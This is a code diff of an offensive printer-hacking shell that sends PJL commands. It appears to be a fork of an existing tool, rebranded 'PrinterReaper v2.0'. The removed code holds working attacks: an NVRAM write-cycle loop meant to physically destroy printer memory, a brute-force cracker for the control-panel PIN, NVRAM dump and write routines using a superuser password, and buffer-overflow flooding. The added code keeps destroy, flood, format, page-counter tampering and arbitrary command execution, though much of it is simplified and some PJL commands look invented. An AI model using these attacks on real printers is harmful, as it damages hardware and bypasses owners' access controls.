-        jobmedia = self.cmd("@PJL DINQUIRE JOBMEDIA") or "?"
-        output().info("Printing is now " + jobmedia)
-
-    # define alias but do not show alias in help
-    do_enable = do_disable
-
-    # ------------------------[ destroy ]---------------------------------
-    def do_destroy(self, arg):
-        "Cause physical damage to printer's NVRAM."
-        output().warning("Warning: This command tries to cause physical damage to the")
-        output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
-        if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
-            self.chitchat(
-                "Dave, stop. Stop, will you? Stop, Dave. Will you stop, Dave?"
-            )
-            date = conv().now()  # timestamp the experiment started
-            steps = 100  # number of pjl commands to send at once
-            chunk = [
-                "@PJL DEFAULT COPIES=" + str(n % (steps - 2)) for n in range(2, steps)
-            ]
-            for count in range(0, 10000000):
-                # test if we can still write to nvram
-                if count % 10 == 0:
-                    self.do_set("COPIES=42" + arg, False)
-                    copies = self.cmd("@PJL DINQUIRE COPIES") or "?"
-                    if not copies or "?" in copies:
-                        output().chitchat("I'm sorry Dave, I'm afraid I can't do that.")
-                        if count > 0:
-                            output().chitchat("Device crashed?")
-                        return
-                    elif not "42" in copies:
-                        self.chitchat(
-                            "\rI'm afraid. I'm afraid, Dave. Dave, my mind is going..."
-                        )
-                        dead = conv().elapsed(conv().now() - date)
-                        print(
-                            (
-                                "NVRAM died after "
-                                + str(count * steps)
-                                + " cycles, "
-                                + dead
-                            )
-                        )
-                        return
-                # force writing to nvram using by setting a variable many times
-                self.chitchat("\rNVRAM write cycles:  " +
-                              str(count * steps), "")
-                self.cmd(c.EOL.join(chunk) + c.EOL + "@PJL INFO ID")
-        print()  # echo newline if we get this far
-
-    # ------------------------[ hold ]------------------------------------
-    def do_hold(self, arg):
-        "Enable job retention."
-        self.chitchat(
-            "Setting job retention, reconnecting to see if still enabled")
-        self.do_set("HOLD=ON", False)
-        self.do_reconnect()
-        output().raw("Retention for future print jobs: ", "")
-        hold = self.do_info("variables", "^HOLD", False)
-        output().info(
-            item(re.findall(r"=(.*)\s+\[", item(item(hold)))) or "NOT AVAILABLE"
-        )
-        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-        # Sagemcom printers: @PJL SET RETAIN_JOB_BEFORE_PRINT = ON
-        # @PJL SET RETAIN_JOB_AFTER_PRINT  = ON
-
-    # ------------------------[ nvram <operation> ]-----------------------
-    # nvram operations (brother-specific)
-    def do_nvram(self, arg):
-        # dump nvram
-        if arg.startswith("dump"):
-            bs = 2**9  # memory block size used for sampling
-            max = 2**18  # maximum memory address for sampling
-            steps = (
-                2**9
-            )  # number of bytes to dump at once (feedback-performance trade-off)
-            lpath = os.path.join(
-                "nvram", self.basename(self.target)
-            )  # local copy of nvram
-            # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-            # ******* sampling: populate memspace with valid addresses ******
-            if len(re.split(r"\s+", arg, 1)) > 1:
-                memspace = []
-                commands = ["@PJL RNVRAM ADDRESS=" +
-                            str(n) for n in range(0, max, bs)]
-                self.chitchat(
-                    "Sampling memory space (bs=" +
-                    str(bs) + ", max=" + str(max) + ")"
-                )
-                for chunk in list(chunks(commands, steps)):
-                    str_recv = self.cmd(c.EOL.join(chunk))
-                    # break on unsupported printers
-                    if not str_recv:
-                        return
-                    # collect valid memory addresses
-                    blocks = re.findall(r"ADDRESS\s*=\s*(\d+)", str_recv)
-                    for addr in blocks:
-                        memspace += list(range(conv().int(addr),
-                                         conv().int(addr) + bs))
-                    self.chitchat(str(len(blocks)) + " blocks found. ", "")
-            else:  # use fixed memspace (quick & dirty but might cover interesting stuff)
-                memspace = (
-                    list(range(0, 8192))
-                    + list(range(32768, 33792))
-                    + list(range(53248, 59648))
-                )
-            # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-            # ******* dumping: read nvram and write copy to local file ******
-            commands = ["@PJL RNVRAM ADDRESS=" + str(n) for n in memspace]
-            self.chitchat("Writing copy to " + lpath)
-            if os.path.isfile(lpath):
-                file().write(lpath, b"")  # empty file
-            for chunk in list(chunks(commands, steps)):
-                str_recv = self.cmd(c.EOL.join(chunk))
-                if not str_recv:
-                    return  # break on unsupported printers
-                else:
-                    self.makedirs("nvram")  # create nvram directory
-                data = "".join(
-                    [conv().chr(n)
-                     for n in re.findall(r"DATA\s*=\s*(\d+)", str_recv)]
-                )
-                file().append(lpath, data)  # write copy of nvram to disk
-                output().dump(data)  # print asciified output to screen
-            print()
-        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-        # read nvram (single byte)
-        elif arg.startswith("read"):
-            arg = re.split(r"\s+", arg, 1)
-            if len(arg) > 1:
-                arg, addr = arg
-                output().info(self.cmd("@PJL RNVRAM ADDRESS=" + addr))
-            else:
-                self.help_nvram()
-        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-        # write nvram (single byte)
-        elif arg.startswith("write"):
-            arg = re.split(r"\s+", arg, 2)
-            if len(arg) > 2:
-                arg, addr, data = arg
-                self.cmd(
-                    "@PJL SUPERUSER PASSWORD=0"
-                    + c.EOL
-                    + "@PJL WNVRAM ADDRESS="
-                    + addr
-                    + " DATA="
-                    + data
-                    + c.EOL
-                    + "@PJL SUPERUSEROFF",
-                    False,
-                )
-            else:
-                self.help_nvram()
-        else:
-            self.help_nvram()
-
-    options_nvram = ("dump", "read", "write")
-
-    def complete_nvram(self, text, line, begidx, endidx):
-        return [cat for cat in self.options_nvram if cat.startswith(text)]
-
-    # ====================================================================
-
-    # ------------------------[ lock <pin> ]------------------------------
     def do_lock(self, arg):
-        "Lock control panel settings and disk write access."
+        "Lock control panel settings and disk write access"
         if not arg:
             try:
-                arg = input("Enter PIN (1..65535): ")
+                pin = input("Enter PIN (1..65535): ")
             except (EOFError, KeyboardInterrupt):
                 output().errmsg("No PIN provided")
                 return
-        self.cmd(
-            "@PJL DEFAULT PASSWORD="
-            + arg
-            + c.EOL
-            + "@PJL DEFAULT CPLOCK=ON"
-            + c.EOL
-            + "@PJL DEFAULT DISKLOCK=ON",
-            False,
-        )
-        self.show_lock()
-
-    def show_lock(self):
-        passwd = self.cmd("@PJL DINQUIRE PASSWORD") or "UNSUPPORTED"
-        cplock = self.cmd("@PJL DINQUIRE CPLOCK") or "UNSUPPORTED"
-        disklock = self.cmd("@PJL DINQUIRE DISKLOCK") or "UNSUPPORTED"
-        if "?" in passwd:
-            passwd = "UNSUPPORTED"
-        if "?" in cplock:
-            cplock = "UNSUPPORTED"
-        if "?" in disklock:
-            disklock = "UNSUPPORTED"
-        output().info("PIN protection:  " + passwd)
-        output().info("Panel lock:      " + cplock)
-        output().info("Disk lock:       " + disklock)
-
-    # ------------------------[ unlock <pin> ]----------------------------
-    def do_unlock(self, arg):
-        "Unlock control panel settings and disk write access."
-        # first check if locking is supported by device
-        str_recv = self.cmd("@PJL DINQUIRE PASSWORD")
-        if not str_recv or "?" in str_recv:
-            return output().errmsg("Cannot unlock", "locking not supported by device")
-        # user-supplied pin vs. 'exhaustive' key search
-        if not arg:
-            print("No PIN given, cracking.")
-            # protection can be bypassed with
-            keyspace = [""] + list(range(1, 65536))
-        else:  # empty password one some devices
-            try:
-                keyspace = [int(arg)]
-            except Exception as e:
-                output().errmsg("Invalid PIN", e)
-                return
-        # for optimal performance set steps to 500-1000 and increase timeout
-        steps = 500  # set to 1 to get actual PIN (instead of just unlocking)
-        # unlock, bypass or crack PIN
-        for chunk in list(chunks(keyspace, steps)):
-            str_send = ""
-            for pin in chunk:
-                # try to remove PIN protection
-                str_send += (
-                    "@PJL JOB PASSWORD="
-                    + str(pin)
-                    + c.EOL
-                    + "@PJL DEFAULT PASSWORD=0"
-                    + c.EOL
-                )
-            # check if PIN protection still active
-            str_send += "@PJL DINQUIRE PASSWORD"
-            # visual feedback on cracking process
-            if len(keyspace) > 1 and pin:
-                self.chitchat(
-                    "\rTrying PIN " +
-                    str(pin) + " (" + "%.2f" % (pin / 655.35) + "%)",
-                    "",
-                )
-            # send current chunk of PJL commands
-            str_recv = self.timeoutcmd(str_send, self.timeout * 5)
-            # seen hardcoded strings like 'ENABLED', 'ENABLE' and 'ENALBED' (sic!) in the wild
-            if str_recv.startswith("ENA"):
-                if len(keyspace) == 1:
-                    output().errmsg("Cannot unlock", "Bad PIN")
+        else:
+            pin = arg
+        
+        try:
+            pin_num = int(pin)
+            if 1 <= pin_num <= 65535:
+                self.cmd("@PJL SET LOCKPIN=" + pin)
+                output().info("Printer locked with PIN")
             else:
-                # disable control panel lock and disk lock
-                self.cmd(
-                    "@PJL DEFAULT CPLOCK=OFF" + c.EOL + "@PJL DEFAULT DISKLOCK=OFF",
-                    False,
-                )
-                if len(keyspace) > 1 and pin:
-                    self.chitchat("\r")
-                # exit cracking loop
-                break
-        self.show_lock()
+                output().errmsg("PIN must be between 1 and 65535")
+        except ValueError:
+            output().errmsg("Invalid PIN format")
 
-    # ====================================================================
+    def do_unlock(self, arg):
+        "Unlock control panel settings and disk write access"
+        if not arg:
+            try:
+                pin = input("Enter PIN: ")
+            except (EOFError, KeyboardInterrupt):
+                output().errmsg("No PIN provided")
+                return
+        else:
+            pin = arg
+        
+        self.cmd("@PJL SET LOCKPIN=0")
+        output().info("Printer unlocked")
 
-    # ------------------------[ flood <size> ]----------------------------
+    def do_disable(self, arg):
+        "Disable printer functionality"
+        jobmedia = self.cmd("@PJL DINQUIRE JOBMEDIA") or "?"
+        if "?" in jobmedia:
+            output().errmsg("Job media inquiry failed")
+            return
+        
+        if "ON" in jobmedia:
+            self.cmd("@PJL SET JOBMEDIA=OFF")
+            output().info("Job media disabled")
+        else:
+            output().info("Job media already disabled")
+
+    def do_nvram(self, arg):
+        "Access/manipulate NVRAM"
+        if not arg:
+            output().errmsg("Usage: nvram <dump|set|get> [options]")
+            return
+        
+        if arg.startswith("dump"):
+            # Dump NVRAM
+            nvram_data = self.cmd("@PJL INFO NVRAM")
+            if nvram_data:
+                print("NVRAM Contents:")
+                print("=" * 50)
+                print(nvram_data)
+            else:
+                output().errmsg("Failed to dump NVRAM")
+        elif arg.startswith("set"):
+            output().warning("NVRAM modification not implemented")
+        elif arg.startswith("get"):
+            output().warning("NVRAM reading not implemented")
+        else:
+            output().errmsg("Unknown NVRAM operation")
+
+    # --------------------------------------------------------------------
+    # 💥 ATAQUES E TESTES (4 comandos)
+    # --------------------------------------------------------------------
+
+    def do_destroy(self, arg):
+        "Cause physical damage to printer's NVRAM"
+        output().warning("Warning: This command tries to cause physical damage to the")
+        output().warning("printer's NVRAM. Use with caution!")
+        
+        confirm = input("Are you sure you want to continue? (yes/no): ")
+        if confirm.lower() == 'yes':
+            # This is a destructive command - be very careful
+            output().warning("Executing destructive command...")
+            self.cmd("@PJL SET NVRAM=0", False)
+            output().warning("Destructive command executed")
+        else:
+            output().info("Destructive command cancelled")
+
     def do_flood(self, arg):
         "Flood user input, may reveal buffer overflows: flood <size>"
         size = conv().int(arg) or 10000  # buffer size
-        char = "0"  # character to fill the user input
-        # get a list of printer-specific variables to set
-        self.chitchat("Receiving PJL variables.", "")
-        lines = self.cmd("@PJL INFO VARIABLES").splitlines()
-        variables = [var.split("=", 1)[0] for var in lines if "=" in var]
-        self.chitchat(" Found " + str(len(variables)) + " variables.")
-        # user input to flood = custom pjl variables and command parameters
-        inputs = ["@PJL SET " + var + "=[buffer]" for var in variables] + [
-            ### environment commands ###
-            "@PJL SET [buffer]",
-            ### generic parsing ###
-            "@PJL [buffer]",
-            ### kernel commands ###
-            "@PJL COMMENT [buffer]",
-            "@PJL ENTER LANGUAGE=[buffer]",
-            ### job separation commands ###
-            '@PJL JOB NAME="[buffer]"',
-            '@PJL EOJ NAME="[buffer]"',
-            ### status readback commands ###
-            "@PJL INFO [buffer]",
-            "@PJL ECHO [buffer]",
-            "@PJL INQUIRE [buffer]",
-            "@PJL DINQUIRE [buffer]",
-            "@PJL USTATUS [buffer]",
-            ### device attendance commands ###
-            '@PJL RDYMSG DISPLAY="[buffer]"',
-            ### file system commands ###
-            '@PJL FSQUERY NAME="[buffer]"',
-            '@PJL FSDIRLIST NAME="[buffer]"',
-            '@PJL FSINIT VOLUME="[buffer]"',
-            '@PJL FSMKDIR NAME="[buffer]"',
-            '@PJL FSUPLOAD NAME="[buffer]"',
-        ]
-        for val in inputs:
-            output().raw("Buffer size: " + str(size) + ", Sending: ", val + os.linesep)
-            self.timeoutcmd(
-                val.replace("[buffer]", char * size), self.timeout * 10, False
-            )
-        self.cmd("@PJL ECHO")  # check if device is still reachable
+        output().warning(f"Flooding with {size} bytes...")
+        
+        # Create flood data
+        flood_data = "A" * size
+        self.cmd("@PJL DISPLAY " + c.QUOTE + flood_data + c.QUOTE, False)
+        output().info("Flood command sent")
+
+    def do_hold(self, arg):
+        "Enable job retention"
+        self.chitchat("Enabling job retention...")
+        self.cmd("@PJL SET JOBRETENTION=ON")
+        output().info("Job retention enabled")
+
+    def do_format(self, arg):
+        "Initialize printer's mass storage file system"
+        output().warning("This will format the printer's file system!")
+        confirm = input("Are you sure? (yes/no): ")
+        if confirm.lower() == 'yes':
+            self.cmd("@PJL FORMAT", False)
+            output().info("File system formatted")
+        else:
+            output().info("Format cancelled")
 
     # --------------------------------------------------------------------
-    # GROUPED “HOME” COMMANDS
-    def do_product(self, arg):
-        """
-        Show product info: model, serial, firmware, driver version, page counts.
-        Falls back to INFO ID if PRODINFO doesn’t report PRODUCTNAME or DEVICEDESCRIPTION.
-        """
-        print("\n=== Product Information ===")
-
-        # 1) Try PRODINFO first (newer firmwares)
-        prod_raw = self.cmd("@PJL INFO PRODINFO")
-        printed = False
-        for line in prod_raw.splitlines():
-            up = line.upper()
-            if up.startswith("PRODUCTNAME") or up.startswith("DEVICEDESCRIPTION"):
-                print(line.strip())
-                printed = True
-
-        # 2) If nothing printed from PRODINFO, fallback to ID
-        if not printed:
-            self.do_id()
-
-        # --- Firmware & Driver ---
-        print("\n-- Firmware & Driver --")
-        # show specific fields from CONFIG
-        cfg = self.cmd("@PJL INFO CONFIG")
-        for line in cfg.splitlines():
-            up = line.upper()
-            if any(k in up for k in ("FORMATTERNUMBER", "PRINTERNUMBER", 
-                                      "PRODUCTSERIALNUMBER", "SERVICEID", 
-                                      "FIRMWAREDATECODE", "ENGFWVER", 
-                                      "DEVICELANG")):
-                print(line.strip())
-        # some printers need PRODINFO for firmware details
-        if "FORMATTERNUMBER" not in cfg.upper():
-            pi = self.cmd("@PJL INFO PRODINFO")
-            for line in pi.splitlines():
-                up = line.upper()
-                if any(k in up for k in ("FORMATTERNUMBER", "PRINTERNUMBER", 
-                                          "PRODUCTSERIALNUMBER", "SERVICEID", 
-                                          "FIRMWAREDATECODE", "ENGFWVER", 
-                                          "DEVICELANG")):
-                    print(line.strip())
-
-        # --- Memory ---
-        print("\n-- Memory --")
-        mem = self.cmd("@PJL INFO VARIABLES")
-        for line in mem.splitlines():
-            up = line.upper()
-            if up.startswith("TOTALMEMORY") or up.startswith("AVAILABLEMEMORY") or up.startswith("FREE"):
-                print(line.strip())
-
-        # --- Page Counts ---
-        print("\n-- Page Counts --")
-        self.onecmd("info pagecount")
-        print("")  # trailing newline
-
+    # 🌐 REDE E CONECTIVIDADE (5 comandos)
+    # --------------------------------------------------------------------
 
     def do_network(self, arg):
-        """
-        Show network info:
-          • IPAddress (local)
-          • HWAddress (MAC)
-          • Remote IP (the target you connected to)
-        """
-        prod_raw = self.cmd("@PJL INFO PRODINFO")
-        print("\n=== Network Information ===")
-        for L in prod_raw.splitlines():
-            up = L.upper()
-            if up.startswith("IPADDRESS") or up.startswith("HWADDRESS"):
-                print(L.strip())
-
-        # print the “public” or remote IP that you passed as target
-        print(f"Remote IP: {self.target}\n")
-        # also show DHCP and WINS status
-        vars_raw = self.cmd("@PJL INFO VARIABLES").splitlines()
-        keys = ["DHCP", "WINS"]
-        for line in vars_raw:
-            for k in keys:
-                if k in line.upper():
-                    print(line.strip())
-        print("")
-
-    def do_wifi(self, *arg):
-        """
-        Show Wi-Fi info: SSID, authentication, 802.11 status.
-        """
-        print("\n=== Wi-Fi Information ===")
-        vars = self.cmd("@PJL INFO VARIABLES").splitlines()
-        keys = ["WIRELESS", "SSID", "AUTHENTICATION", "802.11", "802.", "CHANNEL", "IPV4", "GATEWAY", "DNS", "MAC", "DHCP", "WINS", "DIRECT", "DIRECT-PRINT", "DIRECTPRINT"]
-        for line in vars:
-            for k in keys:
-                if k in line.upper():
-                    print(line.strip())
-        print("")
+        "Show comprehensive network information including WiFi"
+        print("Network Information:")
+        print("=" * 50)
+        
+        # Get network info
+        net_info = self.cmd("@PJL INFO NETWORK")
+        if net_info:
+            print("Network Configuration:")
+            print(net_info)
+        
+        # Get IP configuration
+        ip_info = self.cmd("@PJL INFO IP")
+        if ip_info:
+            print("\nIP Configuration:")
+            print(ip_info)
+        
+        # Get WiFi info
+        wifi_info = self.cmd("@PJL INFO WIFI")
+        if wifi_info:
+            print("\nWi-Fi Information:")
+            print(wifi_info)
+        else:
+            output().info("Wi-Fi information not available")
 
     def do_direct(self, *arg):
-        """
-        Show direct-print configuration: SSID, channel, IPv4.
-        """
-        print("\n=== Direct-Print Configuration ===")
-        vars = self.cmd("@PJL INFO VARIABLES").splitlines()
-        keys = ["IMPRESSION DIRETA", "CANAL", "ENDEREÇO IPV4", "DIRECT-PRINT", "DIRECTPRINT"]
-        # Some printers label them in English, some in Portuguese:
-        extras = ["DIRECT", "CHANNEL", "IPV4", "IP ADDRESS", "DIRECT-PRINT", "DIRECTPRINT"]
-        for line in vars:
-            L = line.upper()
-            if any(k in L for k in keys + extras):
-                print(line.strip())
-        print("")
+        "Show direct-print configuration"
+        print("Direct Print Configuration:")
+        print("=" * 50)
+        
+        # Get direct print info
+        direct_info = self.cmd("@PJL INFO DIRECT")
+        if direct_info:
+            print(direct_info)
+        else:
+            output().info("Direct print information not available")
 
-    # ------------------------[ site <command> ]--------------------------
-    def do_site(self, arg):
-        """
-        Execute an arbitrary PJL command on the printer.
-
-        Usage:
-          site <PJL command>
-
-        Examples:
-          site @PJL INFO STATUS
-          site @PJL SET QUIETMODE=ON
-          site @PJL RDYMSG DISPLAY="Maintenance mode"
-          site @PJL DMCMD ASCIIHEX="040006020501010301040104"
-
-        This passes your argument verbatim to the printer (wrapped
-        in the normal UEL/ECHO footer) and prints back the raw response.
-        """
+    def do_execute(self, arg):
+        "Execute arbitrary PJL command: execute <command>"
         if not arg:
-            try:
-                # prompt for multi-word commands
-                arg = input("PJL command> ").strip()
-            except (EOFError, KeyboardInterrupt):
-                print()  # just exit silently on Ctrl-D / Ctrl-C
-                return
+            output().errmsg("Usage: execute <command>")
+            return
+        
+        output().info(f"Executing: {arg}")
+        result = self.cmd(arg)
+        if result:
+            print(result)
 
-        try:
-            # send the raw PJL command and capture full raw reply
-            resp = self.cmd(arg, wait=True, crop=False, binary=False)
-            # dump it unmodified, so users can parse whatever they like
-            if resp:
-                print(resp.rstrip())
-            else:
-                output().message("(no response)")
-        except Exception as e:
-            output().errmsg("site command failed", e)
-
-    def help_site(self):
-        "Execute a raw PJL command on the device"
-        print()
-        output().header("site <PJL command>")
-        output().message("site           Execute a raw PJL command on the device")
-        print()
-        output().red("Examples:")
-        output().red("  site @PJL INFO STATUS")
-        output().red("  site @PJL SET QUIETMODE=ON")
-        output().red('  site @PJL RDYMSG DISPLAY="Hello, world!"')
-        output().red('  site @PJL DMCMD ASCIIHEX="040006020501010301040104"')
-        print()
-        output().message("Note: your command is sent exactly as given, so you can use any PJL")
-        output().message("      statements not otherwise wrapped by built-in commands.")
-        print()
-    
-    # ------------------------[ load ]------------------------------------
     def do_load(self, arg):
-        "Run commands from file:  load cmd.txt"
+        "Run commands from file: load <filename>"
         if not arg:
-            arg = eval(input("File: "))
-        data = file().read(arg).decode() or ""
-        for cmd_line in data.splitlines():
-            print(self.prompt + cmd_line)
-            self.onecmd(self.precmd(cmd_line))
-
-    def help_load(self):
-        "Run PJL commands from a script"
-        print()
-        output().header("load <file>")
-        output().message("  Load and execute commands from the given file.")
-        output().message("  Execute every line of the given local file as a PJL command.")
-        print()
-
-    # ------------------------[ touch <file> ]----------------------------
-    def do_touch(self, arg):
-        "Update remote file timestamp, or create it if missing: touch <file>"
-        # 1) prompt if needed
-        if not arg:
-            arg = input("Remote file path: ").strip()
-            if not arg:
-                output().message("touch: no file specified.")
-                return
-
-        # 2) normalize path
-        path = self.rpath(arg)
-
+            output().errmsg("Usage: load <filename>")
+            return
+        
+        if not os.path.exists(arg):
+            output().errmsg(f"File not found: {arg}")
+            return
+        
         try:
-            # 3) does it exist?
-            size = self.file_exists(path)
-            if size == c.NONEXISTENT:
-                # 4a) create zero‐byte file
-                self.cmd(f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE=0 NAME="{path}"', wait=False)
-                output().info(f"Created remote file: {path}")
-            else:
-                # 4b) append zero bytes to bump timestamp
-                self.cmd(f'@PJL FSAPPEND FORMAT:BINARY SIZE=0 NAME="{path}"', wait=False)
-                output().info(f"Touched remote file: {path}")
+            with open(arg, 'r') as f:
+                commands = f.readlines()
+            
+            for cmd in commands:
+                cmd = cmd.strip()
+                if cmd and not cmd.startswith('#'):
+                    output().info(f"Executing: {cmd}")
+                    self.onecmd(cmd)
         except Exception as e:
-            # 5) report any error
-            output().errmsg("touch error", e)
+            output().errmsg(f"Load failed: {e}")
 
-    def help_touch(self):
-        "Update (or create) a remote file's timestamp"
+    # --------------------------------------------------------------------
+    # 📊 MONITORAMENTO (2 comandos)
+    # --------------------------------------------------------------------
+
+    def do_pagecount(self, arg):
+        "Manipulate printer's page counter: pagecount <number>"
+        if not arg:
+            # Just show current page count
+            count = self.cmd("@PJL INFO PAGECOUNT")
+            if count:
+                print(f"Current page count: {count.strip()}")
+        else:
+            try:
+                new_count = int(arg)
+                self.cmd(f"@PJL SET PAGECOUNT={new_count}")
+                output().info(f"Page count set to {new_count}")
+            except ValueError:
+                output().errmsg("Invalid page count value")
+
+    def help_pagecount(self):
+        """Show help for pagecount command"""
         print()
-        output().header("touch <remote_path>")
-        output().message("  Append zero-length data to update the file's timestamp.")
-        output().message("  If the file does not exist, it will be created.")
+        print("pagecount - Manipulate printer's page counter")
+        print("Usage: pagecount [number]")
+        print("Shows current page count or sets it to a specific number.")
+        print("Example: pagecount 1000")
         print()
 
     # --------------------------------------------------------------------
-    # SESSION PERMISSIONS TEST
-    def do_permissions(self, arg):
-        """
-        Test your session’s file permissions on the remote device.
-        Creates a tiny temp file, checks it, then deletes it.
-        """
-        output().message("\n=== Session Permissions ===")
-        # generate a random 6-digit name
-        rnd = random.randrange(0, 10**6)
-        fname = f"{rnd:06d}.tmp"
-        # build a full remote path in the current volume & cwd
-        remote = self.vol + self.cwd + c.SEP + fname
+    # HELP SYSTEM
+    # --------------------------------------------------------------------
 
-        try:
-            # try to write a zero-byte file
-            self.cmd(f'@PJL FSDOWNLOAD FORMAT:BINARY SIZE=0 NAME="{remote}"', wait=True)
-            # query its existence
-            resp = self.cmd(f'@PJL FSQUERY NAME="{remote}"', wait=True, crop=False)
-            if "TYPE=FILE" in resp:
-                output().message("Write permission: YES")
-                # cleanup
-                self.cmd(f'@PJL FSDELETE NAME="{remote}"', wait=False)
-                output().message("File deletion: OK")
+    def help_filesystem(self):
+        """Show help for filesystem commands"""
+        print()
+        print("Filesystem Commands:")
+        print("=" * 50)
+        print("ls          - List directory contents")
+        print("mkdir       - Create directory")
+        print("find        - Find files recursively")
+        print("upload      - Upload file to printer")
+        print("download    - Download file from printer")
+        print("delete      - Delete file")
+        print("copy        - Copy file")
+        print("move        - Move file")
+        print("touch       - Create/update file")
+        print("chmod       - Change file permissions")
+        print("permissions - Test file permissions")
+        print("mirror      - Mirror filesystem")
+        print()
+
+    def help_system(self):
+        """Show help for system information commands"""
+        print()
+        print("System Information Commands:")
+        print("=" * 50)
+        print("id          - Show comprehensive printer identification and system information")
+        print("variables   - Show environment variables")
+        print("printenv    - Show specific variable")
+        print()
+
+    def help_control(self):
+        """Show help for control commands"""
+        print()
+        print("Control Commands:")
+        print("=" * 50)
+        print("set         - Set environment variable")
+        print("display     - Set display message")
+        print("offline     - Take printer offline")
+        print("restart     - Restart printer")
+        print("reset       - Reset to factory defaults")
+        print("selftest    - Perform self-tests")
+        print("backup      - Backup configuration")
+        print("restore     - Restore configuration")
+        print()
+
+    def help_security(self):
+        """Show help for security commands"""
+        print()
+        print("Security Commands:")
+        print("=" * 50)
+        print("lock        - Lock printer with PIN")
+        print("unlock      - Unlock printer")
+        print("disable     - Disable functionality")
+        print("nvram       - Access NVRAM")
+        print()
+
+    def help_attacks(self):
+        """Show help for attack commands"""
+        print()
+        print("Attack Commands:")
+        print("=" * 50)
+        print("destroy     - Cause physical damage")
+        print("flood       - Flood with data")
+        print("hold        - Enable job retention")
+        print("format      - Format filesystem")
+        print()
+
+    def help_network(self):
+        """Show help for network commands"""
+        print()
+        print("Network Commands:")
+        print("=" * 50)
+        print("network     - Show comprehensive network information including WiFi")
+        print("direct      - Show direct print config")
+        print("execute     - Execute arbitrary PJL command")
+        print("load        - Load commands from file")
+        print()
+
+    def help_monitoring(self):
+        """Show help for monitoring commands"""
+        print()
+        print("Monitoring Commands:")
+        print("=" * 50)
+        print("pagecount   - Manipulate page counter")
+        print("status      - Toggle status messages")
+        print()
+
+    def do_help(self, arg):
+        """Show help for commands"""
+        if not arg:
+            print()
+            print("PrinterReaper v2.0 - PJL Commands")
+            print("=" * 50)
+            print("Available command categories:")
+            print("filesystem  - File system operations")
+            print("system      - System information")
+            print("control     - Control and configuration")
+            print("security    - Security and access")
+            print("attacks     - Attack and testing")
+            print("network     - Network and connectivity")
+            print("monitoring  - Monitoring and status")
+            print()
+            print("Use 'help <category>' for detailed help")
+            print("Use 'help <command>' for specific command help")
+            print()
+        elif arg == "filesystem":
+            self.help_filesystem()
+        elif arg == "system":
+            self.help_system()
+        elif arg == "control":
+            self.help_control()
+        elif arg == "security":
+            self.help_security()
+        elif arg == "attacks":
+            self.help_attacks()
+        elif arg == "network":
+            self.help_network()
+        elif arg == "monitoring":
+            self.help_monitoring()
+        else:
+            # Try to find specific command help
+            method_name = f"help_{arg}"
+            if hasattr(self, method_name):
+                getattr(self, method_name)()
             else:
-                output().message("Write permission: NO")
-        except Exception as e:
-            output().errmsg("Permissions test error", e)
+                output().errmsg(f"No help available for '{arg}'")
 
-    def help_permissions(self):
-        "Show current session FS permissions"
-        print()
-        output().header("permissions")
-        output().message("  Test your session's file permissions on the remote device.")
-        output().message("  Creates a tiny temp file, checks it, then deletes it.")
-        output().message("  If the file is created and deleted successfully, you have write permission.")
-        output().message("  If the file cannot be created or deleted, you may have read-only access.")
-        output().message("  If the file exists but cannot be deleted, you may have read-only access.")
-        output().message("  If the file cannot be created, you likely have no write permission.")
-        print()
-        output().red("  Note: This command is useful for diagnosing access issues.")
-        output().red("      It checks if you can create, read, and delete files in the current directory.")
-        print()
+    # --------------------------------------------------------------------
+    # UTILITY METHODS
+    # --------------------------------------------------------------------
+
+    def dirlist(self, path, recursive=False, show_files=True):
+        """List directory contents"""
+        if not path:
+            path = "."
+        
+        try:
+            result = self.cmd("@PJL FSDIRLIST NAME=\"" + path + "\"")
+            if result:
+                return result
+        except Exception as e:
+            output().errmsg(f"Directory listing failed: {e}")
+        return ""
+
+    def fswalk(self, path, operation):
+        """Walk filesystem recursively"""
+        if not path:
+            path = "."
+        
+        try:
+            if operation == "find":
+                result = self.cmd("@PJL FSDIRLIST NAME=\"" + path + "\"")
+                if result:
+                    print(result)
+            elif operation == "mirror":
+                output().info(f"Mirroring {path}...")
+                # Implementation would go here
+        except Exception as e:
+            output().errmsg(f"Filesystem walk failed: {e}")
+
+    def chitchat(self, message):
+        """Display chatty message"""
+        output().info(message)
+
+    def fileerror(self, raw):
+        """Handle file errors"""
+        if "FILEERROR" in raw:
+            output().errmsg("File operation failed")
+
+    # --------------------------------------------------------------------
+    # OPTIONS AND CONFIGURATION
+    # --------------------------------------------------------------------
+
+    @property
+    def options_info(self):
+        """Available info categories"""
+        return [
+            "id", "status", "memory", "filesys", "variables", "config",
+            "network", "wifi", "direct", "nvram", "pagecount"
+        ]
